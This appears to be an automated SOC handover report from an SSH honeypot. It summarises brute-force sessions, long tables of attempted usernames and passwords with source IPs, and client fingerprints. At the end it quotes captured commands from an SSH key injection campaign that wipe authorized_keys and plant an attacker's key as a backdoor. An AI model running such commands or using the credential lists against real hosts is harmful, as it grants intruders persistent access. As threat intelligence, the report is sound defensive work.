# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-24 |
| **Generated At** | 2026-08-24T03:07:48Z |
| **Shift Time** | 03:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **393** |
| Confirmed Threats | **389** |
| False Positives Filtered | **4** (1.0%) |
| Unique Attacker IPs | **69** |
| Countries of Origin | **24** |
| High Severity Cases | **319** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **74** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **336** |
| Unique Credential Pairs | **294** |
| Unique Usernames | **122** |
| Unique Passwords | **217** |
| Successful Auth Pairs | **327** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 95 |
| `ubuntu` | 18 |
| `test` | 13 |
| `guest` | 9 |
| `support` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 24 |
| `123` | 11 |
| `1` | 9 |
| `1234` | 7 |
| `12345678` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `test` | `test2000` | 6 |
| `blank` | `blank2006` | 6 |
| `admin` | `admin2023` | 6 |
| `root` | `root2023` | 5 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `guest` | `guest2024` | `182.95.190.150` | 2026-08-24T00:56:18 |
| `guest` | `guest2024` | `118.45.113.140` | 2026-08-24T00:56:27 |
| `centos` | `centos2020` | `27.39.130.144` | 2026-08-24T00:58:59 |
| `ubuntu` | `Admin123@` | `217.60.255.130` | 2026-08-24T01:02:39 |
| `root` | `Mayank@123` | `217.60.255.130` | 2026-08-24T01:02:43 |
| `default` | `default2002` | `122.187.147.13` | 2026-08-24T01:04:05 |
| `default` | `default2002` | `182.60.128.241` | 2026-08-24T01:04:14 |
| `supervisor` | `supervisor2012` | `128.185.12.179` | 2026-08-24T01:07:30 |
| `supervisor` | `supervisor2012` | `91.92.211.46` | 2026-08-24T01:07:36 |
| `supervisor` | `supervisor2012` | `46.210.94.61` | 2026-08-24T01:07:38 |
| `support` | `support` | `176.53.159.196` | 2026-08-24T01:09:08 |
| `root` | `root2018` | `10.0.0.73` | 2026-08-24T01:11:50 |
| `ubuntu` | `P4ssw0rd!@#` | `217.60.255.130` | 2026-08-24T01:12:09 |
| `root` | `Medical@123` | `217.60.255.130` | 2026-08-24T01:12:13 |
| `root` | `qwerty123` | `91.92.40.153` | 2026-08-24T01:13:06 |
| `root1` | `1` | `91.92.40.153` | 2026-08-24T01:13:12 |
| `deploy` | `qwerty` | `91.92.40.153` | 2026-08-24T01:13:18 |
| `root` | `root2018` | `117.211.77.86` | 2026-08-24T01:13:18 |
| `root` | `00000000000` | `91.92.40.153` | 2026-08-24T01:13:23 |
| `root` | `root2018` | `217.24.185.98` | 2026-08-24T01:13:26 |
| `root` | `123@@@` | `91.92.40.153` | 2026-08-24T01:13:28 |
| `root` | `root1234` | `91.92.40.153` | 2026-08-24T01:13:33 |
| `odoo18` | `odoo18` | `91.92.40.153` | 2026-08-24T01:13:38 |
| `kingbase` | `123456` | `91.92.40.153` | 2026-08-24T01:13:44 |
| `deploy` | `rootroot` | `91.92.40.153` | 2026-08-24T01:13:49 |
| `rdpuser` | `123456` | `91.92.40.153` | 2026-08-24T01:13:54 |
| `claude` | `123456` | `91.92.40.153` | 2026-08-24T01:13:59 |
| `daniel` | `daniel` | `91.92.40.153` | 2026-08-24T01:14:04 |
| `root` | `1qaz!QAZ` | `91.92.40.153` | 2026-08-24T01:14:10 |
| `root` | `qweasdzxc` | `91.92.40.153` | 2026-08-24T01:14:15 |
| `root` | `modzmodz` | `91.92.40.153` | 2026-08-24T01:14:20 |
| `mcserver` | `mcserver` | `91.92.40.153` | 2026-08-24T01:14:25 |
| `server` | `12345` | `91.92.40.153` | 2026-08-24T01:14:31 |
| `debian` | `debian` | `91.92.40.153` | 2026-08-24T01:14:36 |
| `root` | `11223344` | `91.92.40.153` | 2026-08-24T01:14:41 |
| `zlm` | `123456` | `91.92.40.153` | 2026-08-24T01:14:46 |
| `git` | `git123` | `91.92.40.153` | 2026-08-24T01:14:51 |
| `root` | `000000` | `91.92.40.153` | 2026-08-24T01:14:57 |
| `ubuntu` | `1` | `91.92.40.153` | 2026-08-24T01:15:02 |
| `myuser` | `myuser` | `91.92.40.153` | 2026-08-24T01:15:07 |
| `frappe` | `123` | `91.92.40.153` | 2026-08-24T01:15:12 |
| `trader` | `trader123` | `91.92.40.153` | 2026-08-24T01:15:17 |
| `root` | `26262626` | `91.92.40.153` | 2026-08-24T01:15:22 |
| `guest` | `abc123` | `91.92.40.153` | 2026-08-24T01:15:28 |
| `testuser` | `123` | `91.92.40.153` | 2026-08-24T01:15:33 |
| `nvidia` | `nvidia` | `91.92.40.153` | 2026-08-24T01:15:38 |
| `localhost` | `localhost` | `91.92.40.153` | 2026-08-24T01:15:44 |
| `webadmin` | `123456` | `91.92.40.153` | 2026-08-24T01:15:49 |
| `aiuser` | `aiuser` | `91.92.40.153` | 2026-08-24T01:15:54 |
| `oracle` | `oracle` | `91.92.40.153` | 2026-08-24T01:16:00 |
| `root` | `abc123456` | `91.92.40.153` | 2026-08-24T01:16:05 |
| `root` | `Aa112211..` | `91.92.40.153` | 2026-08-24T01:16:10 |
| `root` | `28011988` | `91.92.40.153` | 2026-08-24T01:16:16 |
| `fastuser` | `12345678` | `91.92.40.153` | 2026-08-24T01:16:21 |
| `orange` | `orange` | `91.92.40.153` | 2026-08-24T01:16:26 |
| `steam` | `steam` | `91.92.40.153` | 2026-08-24T01:16:32 |
| `root` | `admin1` | `91.92.40.153` | 2026-08-24T01:16:37 |
| `pi` | `root` | `91.92.40.153` | 2026-08-24T01:16:42 |
| `claude` | `123` | `91.92.40.153` | 2026-08-24T01:16:48 |
| `root` | `123admin` | `91.92.40.153` | 2026-08-24T01:16:53 |
| `niaoyun` | `123456` | `91.92.40.153` | 2026-08-24T01:16:58 |
| `crafty` | `12345678` | `91.92.40.153` | 2026-08-24T01:17:04 |
| `user` | `12345` | `91.92.40.153` | 2026-08-24T01:17:09 |
| `mysql` | `mysql` | `91.92.40.153` | 2026-08-24T01:17:15 |
| `dev` | `password` | `91.92.40.153` | 2026-08-24T01:17:20 |
| `test` | `test@123` | `91.92.40.153` | 2026-08-24T01:17:25 |
| `codex` | `codex` | `91.92.40.153` | 2026-08-24T01:17:30 |
| `media` | `rock` | `91.92.40.153` | 2026-08-24T01:17:36 |
| `root` | `qwe123!@` | `91.92.40.153` | 2026-08-24T01:17:41 |
| `amir` | `amir` | `91.92.40.153` | 2026-08-24T01:17:46 |
| `rdpuser` | `rdpuser` | `91.92.40.153` | 2026-08-24T01:17:52 |
| `root` | `Root@123` | `91.92.40.153` | 2026-08-24T01:17:57 |
| `ftpuser` | `ftpuser123` | `91.92.40.153` | 2026-08-24T01:18:02 |
| `root` | `qwer` | `91.92.40.153` | 2026-08-24T01:18:08 |
| `frappe` | `admin` | `91.92.40.153` | 2026-08-24T01:18:13 |
| `rancher` | `rancher` | `91.92.40.153` | 2026-08-24T01:18:18 |
| `root` | `123321` | `91.92.40.153` | 2026-08-24T01:18:24 |
| `root` | `Aa12345678@` | `91.92.40.153` | 2026-08-24T01:18:29 |
| `vpn` | `vpn` | `91.92.40.153` | 2026-08-24T01:18:34 |
| `ubuntu` | `1qaz@WSX` | `91.92.40.153` | 2026-08-24T01:18:40 |
| `root` | `112233` | `91.92.40.153` | 2026-08-24T01:18:45 |
| `ubuntu` | `admin@123` | `91.92.40.153` | 2026-08-24T01:18:51 |
| `operator` | `operator` | `91.92.40.153` | 2026-08-24T01:18:56 |
| `web` | `1` | `91.92.40.153` | 2026-08-24T01:19:01 |
| `root` | `Aa112211` | `91.92.40.153` | 2026-08-24T01:19:06 |
| `support` | `Passw0rd` | `91.92.40.153` | 2026-08-24T01:19:12 |
| `user4` | `user4` | `91.92.40.153` | 2026-08-24T01:19:17 |
| `root` | `Welcome123` | `91.92.40.153` | 2026-08-24T01:19:22 |
| `root` | `admin` | `91.92.40.153` | 2026-08-24T01:19:27 |
| `ai` | `ai` | `91.92.40.153` | 2026-08-24T01:19:33 |
| `sam` | `123456789` | `91.92.40.153` | 2026-08-24T01:19:38 |
| `root` | `hello123` | `91.92.40.153` | 2026-08-24T01:19:43 |
| `cloud` | `cloud` | `91.92.40.153` | 2026-08-24T01:19:49 |
| `root` | `zaq12wsx` | `91.92.40.153` | 2026-08-24T01:19:54 |
| `worker` | `worker` | `91.92.40.153` | 2026-08-24T01:19:59 |
| `es` | `123456` | `91.92.40.153` | 2026-08-24T01:20:05 |
| `claude` | `1234` | `91.92.40.153` | 2026-08-24T01:20:10 |
| `odoo17` | `odoo17` | `91.92.40.153` | 2026-08-24T01:20:15 |
| `root` | `1q2w3e` | `91.92.40.153` | 2026-08-24T01:20:21 |
| `root` | `119110120` | `91.92.40.153` | 2026-08-24T01:20:26 |
| `kubernetes` | `kubernetes` | `91.92.40.153` | 2026-08-24T01:20:31 |
| `root` | `dxfUgwfiNcx8` | `91.92.40.153` | 2026-08-24T01:20:36 |
| `sftpuser` | `123` | `91.92.40.153` | 2026-08-24T01:20:42 |
| `administrator` | `Passw0rd` | `91.92.40.153` | 2026-08-24T01:20:47 |
| `root` | `!QAZ2wsx3edc` | `91.92.40.153` | 2026-08-24T01:20:52 |
| `deployer` | `deployer` | `91.92.40.153` | 2026-08-24T01:20:57 |
| `main` | `1234` | `91.92.40.153` | 2026-08-24T01:21:03 |
| `administrator` | `administrator` | `91.92.40.153` | 2026-08-24T01:21:08 |
| `appuser` | `appuser` | `91.92.40.153` | 2026-08-24T01:21:13 |
| `lin` | `123456` | `91.92.40.153` | 2026-08-24T01:21:18 |
| `root` | `momo123` | `91.92.40.153` | 2026-08-24T01:21:23 |
| `test` | `test` | `91.92.40.153` | 2026-08-24T01:21:28 |
| `ubuntu` | `dspace@2025` | `217.60.255.130` | 2026-08-24T01:21:33 |
| `node` | `123456` | `91.92.40.153` | 2026-08-24T01:21:34 |
| `root` | `Mesh@123` | `217.60.255.130` | 2026-08-24T01:21:37 |
| `user` | `123` | `91.92.40.153` | 2026-08-24T01:21:39 |
| `admin1` | `admin1` | `91.92.40.153` | 2026-08-24T01:21:44 |
| `milad` | `milad` | `91.92.40.153` | 2026-08-24T01:21:49 |
| `ossuser` | `Changeme_123` | `91.92.40.153` | 2026-08-24T01:21:55 |
| `odoo14` | `odoo14` | `91.92.40.153` | 2026-08-24T01:22:00 |
| `node` | `1qaz2wsx` | `91.92.40.153` | 2026-08-24T01:22:05 |
| `splunk` | `splunk` | `91.92.40.153` | 2026-08-24T01:22:10 |
| `test` | `1` | `91.92.40.153` | 2026-08-24T01:22:16 |
| `root` | `root2023` | `10.0.0.73` | 2026-08-24T01:22:16 |
| `student` | `redhat` | `91.92.40.153` | 2026-08-24T01:22:21 |
| `root` | `999` | `91.92.40.153` | 2026-08-24T01:22:26 |
| `root` | `7` | `91.92.40.153` | 2026-08-24T01:22:31 |
| `rdpuser` | `123` | `91.92.40.153` | 2026-08-24T01:22:36 |
| `app` | `root` | `91.92.40.153` | 2026-08-24T01:22:41 |
| `minecraft` | `1` | `91.92.40.153` | 2026-08-24T01:22:46 |
| `root` | `12345678` | `91.92.40.153` | 2026-08-24T01:22:52 |
| `teste` | `teste` | `91.92.40.153` | 2026-08-24T01:22:57 |
| `master` | `123` | `91.92.40.153` | 2026-08-24T01:23:02 |
| `adminuser` | `adminuser` | `91.92.40.153` | 2026-08-24T01:23:08 |
| `root` | `P@55w0rd` | `91.92.40.153` | 2026-08-24T01:23:13 |
| `john` | `john` | `91.92.40.153` | 2026-08-24T01:23:18 |
| `admin` | `0000` | `91.92.40.153` | 2026-08-24T01:23:24 |
| `runner` | `1` | `91.92.40.153` | 2026-08-24T01:23:29 |
| `work` | `work` | `91.92.40.153` | 2026-08-24T01:23:34 |
| `root` | `1` | `91.92.40.153` | 2026-08-24T01:23:40 |
| `pi` | `pi` | `91.92.40.153` | 2026-08-24T01:23:45 |
| `root` | `qwer1234` | `91.92.40.153` | 2026-08-24T01:23:50 |
| `ftpuser` | `123456` | `91.92.40.153` | 2026-08-24T01:23:55 |
| `deploy` | `toor` | `91.92.40.153` | 2026-08-24T01:24:00 |
| `appuser` | `password` | `91.92.40.153` | 2026-08-24T01:24:06 |
| `admin1` | `modzmodz` | `91.92.40.153` | 2026-08-24T01:24:11 |
| `trader` | `12345678` | `91.92.40.153` | 2026-08-24T01:24:16 |
| `root` | `linux123` | `91.92.40.153` | 2026-08-24T01:24:22 |
| `git` | `git` | `91.92.40.153` | 2026-08-24T01:24:27 |
| `root` | `P@55word` | `91.92.40.153` | 2026-08-24T01:24:32 |
| `user` | `111` | `91.92.40.153` | 2026-08-24T01:24:37 |
| `bot` | `bot` | `91.92.40.153` | 2026-08-24T01:24:43 |
| `dev` | `abc123` | `91.92.40.153` | 2026-08-24T01:24:48 |
| `wso2` | `wso2` | `91.92.40.153` | 2026-08-24T01:24:53 |
| `root` | `Passw0rd` | `91.92.40.153` | 2026-08-24T01:24:59 |
| `ivan` | `ivan` | `91.92.40.153` | 2026-08-24T01:25:04 |
| `root` | `!qaz@WSX` | `91.92.40.153` | 2026-08-24T01:25:10 |
| `root` | `admin123` | `91.92.40.153` | 2026-08-24T01:25:15 |
| `user` | `1111` | `91.92.40.153` | 2026-08-24T01:25:20 |
| `ansible` | `ansible` | `91.92.40.153` | 2026-08-24T01:25:30 |
| `root` | `1qazxsw2` | `91.92.40.153` | 2026-08-24T01:25:36 |
| `root` | `t0talc0ntr0l4!` | `91.92.40.153` | 2026-08-24T01:25:41 |
| `gg` | `gg` | `91.92.40.153` | 2026-08-24T01:25:46 |
| `bob` | `1234` | `91.92.40.153` | 2026-08-24T01:25:51 |
| `root` | `19821031` | `91.92.40.153` | 2026-08-24T01:25:56 |
| `root` | `Aa@123456` | `91.92.40.153` | 2026-08-24T01:26:02 |
| `rocky` | `rocky` | `91.92.40.153` | 2026-08-24T01:26:07 |
| `user1` | `password123456789` | `91.92.40.153` | 2026-08-24T01:26:12 |
| `root` | `abc12345` | `91.92.40.153` | 2026-08-24T01:26:17 |
| `nginx` | `nginx` | `91.92.40.153` | 2026-08-24T01:26:23 |
| `developer` | `developer` | `91.92.40.153` | 2026-08-24T01:26:28 |
| `frappe` | `frappe123` | `91.92.40.153` | 2026-08-24T01:26:33 |
| `root` | `19860123` | `91.92.40.153` | 2026-08-24T01:26:38 |
| `root` | `asdfasdf-space` | `91.92.40.153` | 2026-08-24T01:26:43 |
| `claude` | `abc123` | `91.92.40.153` | 2026-08-24T01:26:49 |
| `gitlab-runner` | `gitlab-runner` | `91.92.40.153` | 2026-08-24T01:26:54 |
| `erpnext` | `erpnext` | `91.92.40.153` | 2026-08-24T01:27:00 |
| `root` | `root@2026` | `91.92.40.153` | 2026-08-24T01:27:05 |
| `root` | `0` | `91.92.40.153` | 2026-08-24T01:27:10 |
| `admin1` | `12345` | `91.92.40.153` | 2026-08-24T01:27:15 |
| `john` | `123456` | `91.92.40.153` | 2026-08-24T01:27:21 |
| `ec2-user` | `123456` | `91.92.40.153` | 2026-08-24T01:27:26 |
| `root` | `123123123a` | `91.92.40.153` | 2026-08-24T01:27:31 |
| `myuser` | `123456` | `91.92.40.153` | 2026-08-24T01:27:37 |
| `root` | `q1w2e3r4` | `91.92.40.153` | 2026-08-24T01:27:42 |
| `appuser` | `123456` | `91.92.40.153` | 2026-08-24T01:27:47 |
| `term2` | `term2` | `91.92.40.153` | 2026-08-24T01:27:53 |
| `root` | `1234` | `91.92.40.153` | 2026-08-24T01:27:58 |
| `root` | `admin@123` | `91.92.40.153` | 2026-08-24T01:28:03 |
| `master` | `passwd` | `91.92.40.153` | 2026-08-24T01:28:09 |
| `hadoop` | `hadoop123` | `91.92.40.153` | 2026-08-24T01:28:14 |
| `root` | `Ab123456` | `91.92.40.153` | 2026-08-24T01:28:19 |
| `ts3` | `123` | `91.92.40.153` | 2026-08-24T01:28:24 |
| `ftp` | `123456` | `91.92.40.153` | 2026-08-24T01:28:30 |
| `alex` | `12345678` | `91.92.40.153` | 2026-08-24T01:28:35 |
| `fahmi` | `fahmi` | `91.92.40.153` | 2026-08-24T01:28:40 |
| `odoo18` | `odoo` | `91.92.40.153` | 2026-08-24T01:28:45 |
| `root` | `null` | `91.92.40.153` | 2026-08-24T01:28:50 |
| `root` | `huawei@123` | `91.92.40.153` | 2026-08-24T01:28:55 |
| `demo` | `demo` | `91.92.40.153` | 2026-08-24T01:29:01 |
| `ubuntu` | `qwe123` | `91.92.40.153` | 2026-08-24T01:29:06 |
| `ftpuser` | `123456789` | `91.92.40.153` | 2026-08-24T01:29:11 |
| `guest` | `123456` | `91.92.40.153` | 2026-08-24T01:29:16 |
| `root` | `12345qwert` | `91.92.40.153` | 2026-08-24T01:29:21 |
| `root` | `******` | `91.92.40.153` | 2026-08-24T01:29:27 |
| `developer` | `12345` | `91.92.40.153` | 2026-08-24T01:29:32 |
| `user` | `111111` | `91.92.40.153` | 2026-08-24T01:29:37 |
| `sysupdate` | `123456` | `91.92.40.153` | 2026-08-24T01:29:42 |
| `admin` | `Huawei12` | `91.92.40.153` | 2026-08-24T01:29:47 |
| `sftpuser` | `sftpuser` | `91.92.40.153` | 2026-08-24T01:29:53 |
| `steam` | `1` | `91.92.40.153` | 2026-08-24T01:29:58 |
| `super` | `super` | `91.92.40.153` | 2026-08-24T01:30:03 |
| `user` | `123456` | `91.92.40.153` | 2026-08-24T01:30:08 |
| `webadmin` | `123` | `91.92.40.153` | 2026-08-24T01:30:14 |
| `root` | `Huawei@123` | `91.92.40.153` | 2026-08-24T01:30:19 |
| `root` | `Aa1234567890` | `91.92.40.153` | 2026-08-24T01:30:24 |
| `dev` | `123456` | `91.92.40.153` | 2026-08-24T01:30:29 |
| `runner` | `runner` | `91.92.40.153` | 2026-08-24T01:30:34 |
| `dmdba` | `123456` | `91.92.40.153` | 2026-08-24T01:30:40 |
| `root` | `Huawei123` | `91.92.40.153` | 2026-08-24T01:30:45 |
| `sysupdate` | `Password1` | `91.92.40.153` | 2026-08-24T01:30:50 |
| `admin123` | `admin123` | `91.92.40.153` | 2026-08-24T01:30:56 |
| `dani` | `dani` | `91.92.40.153` | 2026-08-24T01:31:00 |
| `default` | `default2002` | `220.116.113.35` | 2026-08-24T01:31:05 |
| `admin1` | `1234` | `91.92.40.153` | 2026-08-24T01:31:05 |
| `ubuntu` | `Pass.123` | `217.60.255.130` | 2026-08-24T01:31:08 |
| `claude` | `claude123` | `91.92.40.153` | 2026-08-24T01:31:11 |
| `root` | `Velocity@123` | `217.60.255.130` | 2026-08-24T01:31:13 |
| `rdpuser` | `1234` | `91.92.40.153` | 2026-08-24T01:31:16 |
| `ubuntu` | `root` | `91.92.40.153` | 2026-08-24T01:31:21 |
| `master` | `qwerty` | `91.92.40.153` | 2026-08-24T01:31:26 |
| `username` | `123` | `91.92.40.153` | 2026-08-24T01:31:31 |
| `newuser` | `123456` | `91.92.40.153` | 2026-08-24T01:31:36 |
| `root` | `@123456789` | `91.92.40.153` | 2026-08-24T01:31:41 |
| `jack` | `jack` | `91.92.40.153` | 2026-08-24T01:31:46 |
| `ubuntu` | `1qaz2wsx` | `91.92.40.153` | 2026-08-24T01:31:52 |
| `root` | `88888888` | `91.92.40.153` | 2026-08-24T01:31:57 |
| `deploy` | `password` | `91.92.40.153` | 2026-08-24T01:32:02 |
| `student` | `password` | `91.92.40.153` | 2026-08-24T01:32:07 |
| `webmaster` | `webmaster` | `91.92.40.153` | 2026-08-24T01:32:12 |
| `hduser` | `hduser` | `91.92.40.153` | 2026-08-24T01:32:17 |
| `openclaw` | `123456` | `91.92.40.153` | 2026-08-24T01:32:23 |
| `user10` | `user10` | `91.92.40.153` | 2026-08-24T01:32:28 |
| `playground` | `playground` | `91.92.40.153` | 2026-08-24T01:32:33 |
| `esroot` | `esroot` | `91.92.40.153` | 2026-08-24T01:32:38 |
| `admins` | `admins` | `91.92.40.153` | 2026-08-24T01:32:43 |
| `deploy` | `1234` | `91.92.40.153` | 2026-08-24T01:32:48 |
| `nutanix` | `nutanix/4u` | `91.92.40.153` | 2026-08-24T01:32:54 |
| `root1` | `123456` | `91.92.40.153` | 2026-08-24T01:32:59 |
| `openclaw` | `1` | `91.92.40.153` | 2026-08-24T01:33:05 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-24T01:33:09 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-24T01:33:09 |
| `root` | `root@1234` | `91.92.40.153` | 2026-08-24T01:33:10 |
| `appuser` | `root` | `91.92.40.153` | 2026-08-24T01:33:15 |
| `service` | `service` | `91.92.40.153` | 2026-08-24T01:33:20 |
| `vyos` | `vyos` | `91.92.40.153` | 2026-08-24T01:33:25 |
| `claude` | `claude` | `91.92.40.153` | 2026-08-24T01:33:31 |
| `ftpuser` | `12345678` | `91.92.40.153` | 2026-08-24T01:33:36 |
| `root` | `111111` | `91.92.40.153` | 2026-08-24T01:33:42 |
| `myuser` | `123` | `91.92.40.153` | 2026-08-24T01:33:47 |
| `root` | `Welcome@123` | `91.92.40.153` | 2026-08-24T01:33:53 |
| `root` | `baidu@123` | `91.92.40.153` | 2026-08-24T01:33:58 |
| `almalinux` | `almalinux` | `91.92.40.153` | 2026-08-24T01:34:03 |
| `Caps` | `Caps` | `91.92.40.153` | 2026-08-24T01:34:08 |
| `admin1` | `123123` | `91.92.40.153` | 2026-08-24T01:34:14 |
| `test` | `test@12345` | `91.92.40.153` | 2026-08-24T01:34:19 |
| `postgres` | `postgres123` | `91.92.40.153` | 2026-08-24T01:34:24 |
| `manish` | `manish` | `15.235.192.186` | 2026-08-24T01:35:47 |
| `345gs5662d34` | `345gs5662d34` | `15.235.192.186` | 2026-08-24T01:35:51 |
| `manish` | `3245gs5662d34` | `15.235.192.186` | 2026-08-24T01:35:52 |
| `test` | `test2000` | `121.159.71.249` | 2026-08-24T01:36:03 |
| `test` | `test2000` | `61.220.35.158` | 2026-08-24T01:36:08 |
| `root` | `Ctyun@2026` | `50.116.72.11` | 2026-08-24T01:38:41 |
| `345gs5662d34` | `345gs5662d34` | `50.116.72.11` | 2026-08-24T01:38:43 |
| `root` | `3245gs5662d34` | `50.116.72.11` | 2026-08-24T01:38:43 |
| `azuracast` | `azuracast` | `107.150.103.210` | 2026-08-24T01:38:55 |
| `345gs5662d34` | `345gs5662d34` | `107.150.103.210` | 2026-08-24T01:39:04 |
| `azuracast` | `3245gs5662d34` | `107.150.103.210` | 2026-08-24T01:39:04 |
| `root` | `root2023` | `103.7.60.253` | 2026-08-24T01:39:44 |
| `root` | `root2023` | `203.252.10.4` | 2026-08-24T01:39:53 |
| `root` | `root2023` | `122.160.15.31` | 2026-08-24T01:39:57 |
| `ubuntu` | `data2025` | `217.60.255.130` | 2026-08-24T01:40:36 |
| `root` | `Corpus@123` | `217.60.255.130` | 2026-08-24T01:40:40 |
| `support` | `support2005` | `10.0.0.73` | 2026-08-24T01:43:49 |
| `test` | `test2000` | `10.0.0.73` | 2026-08-24T01:47:03 |
| `ubuntu` | `poiuyt` | `217.60.255.130` | 2026-08-24T01:50:09 |
| `root` | `Empirical@123` | `217.60.255.130` | 2026-08-24T01:50:13 |
| `blank` | `blank2006` | `10.0.0.73` | 2026-08-24T01:54:34 |
| `ubuntu` | `passer` | `217.60.255.130` | 2026-08-24T01:59:43 |
| `root` | `ASD@123` | `217.60.255.130` | 2026-08-24T01:59:47 |
| `support` | `support2005` | `220.180.249.165` | 2026-08-24T02:00:27 |
| `test` | `test2000` | `190.60.37.146` | 2026-08-24T02:03:17 |
| `test` | `test2000` | `124.67.120.106` | 2026-08-24T02:03:27 |
| `ubuntu` | `P@ssw0rd.123` | `217.60.255.130` | 2026-08-24T02:09:16 |
| `root` | `admin777` | `217.60.255.130` | 2026-08-24T02:09:20 |
| `blank` | `blank2006` | `190.60.37.146` | 2026-08-24T02:11:57 |
| `blank` | `blank2006` | `69.126.144.30` | 2026-08-24T02:12:09 |
| `blank` | `blank2006` | `81.214.75.248` | 2026-08-24T02:12:10 |
| `blank` | `blank2006` | `2.184.158.56` | 2026-08-24T02:12:17 |
| `admin` | `admin2023` | `10.0.0.73` | 2026-08-24T02:15:41 |
| `admin` | `admin2023` | `187.115.144.103` | 2026-08-24T02:17:16 |
| `admin` | `admin2023` | `60.220.241.50` | 2026-08-24T02:17:25 |
| `ubuntu` | `ADMIN123` | `217.60.255.130` | 2026-08-24T02:18:40 |
| `root` | `starwars` | `217.60.255.130` | 2026-08-24T02:18:44 |
| `default` | `p@ssw0rd` | `10.0.0.73` | 2026-08-24T02:18:59 |
| `support` | `support` | `10.0.0.73` | 2026-08-24T02:19:17 |
| `ubuntu` | `Lucas@123` | `217.60.255.130` | 2026-08-24T02:28:13 |
| `root` | `Admin123#` | `217.60.255.130` | 2026-08-24T02:28:17 |
| `root` | `﻿------fuck------` | `222.215.159.14` | 2026-08-24T02:32:28 |
| `admin` | `admin2023` | `93.117.127.141` | 2026-08-24T02:32:30 |
| `admin` | `admin2023` | `208.109.38.143` | 2026-08-24T02:32:37 |
| `default` | `p@ssw0rd` | `36.93.154.207` | 2026-08-24T02:35:25 |
| `default` | `p@ssw0rd` | `47.247.73.99` | 2026-08-24T02:35:34 |
| `ubuntu` | `Qwerty!123` | `217.60.255.130` | 2026-08-24T02:37:37 |
| `root` | `terminal` | `217.60.255.130` | 2026-08-24T02:37:41 |
| `guest` | `guest2002` | `64.181.172.46` | 2026-08-24T02:40:05 |
| `guest` | `guest2004` | `182.75.234.236` | 2026-08-24T02:44:08 |
| `guest` | `guest2004` | `58.57.154.146` | 2026-08-24T02:44:26 |
| `ubuntu` | `linux` | `217.60.255.130` | 2026-08-24T02:47:10 |
| `root` | `2wsxXSW@` | `217.60.255.130` | 2026-08-24T02:47:14 |
| `test` | `test2007` | `10.0.0.73` | 2026-08-24T02:47:40 |
| `test` | `test2007` | `36.93.154.207` | 2026-08-24T02:49:13 |
| `test` | `test2007` | `92.84.21.186` | 2026-08-24T02:49:24 |
| `guest` | `guest2002` | `10.0.0.73` | 2026-08-24T02:51:01 |
| `daisy` | `daisy` | `20.96.179.87` | 2026-08-24T02:53:56 |
| `345gs5662d34` | `345gs5662d34` | `20.96.179.87` | 2026-08-24T02:53:57 |
| `daisy` | `3245gs5662d34` | `20.96.179.87` | 2026-08-24T02:53:57 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **393** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 251 |
| libssh | 43 |
| OpenSSH | 35 |
| Paramiko (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 244 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 35 | 33 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 244 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 35 | 33 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
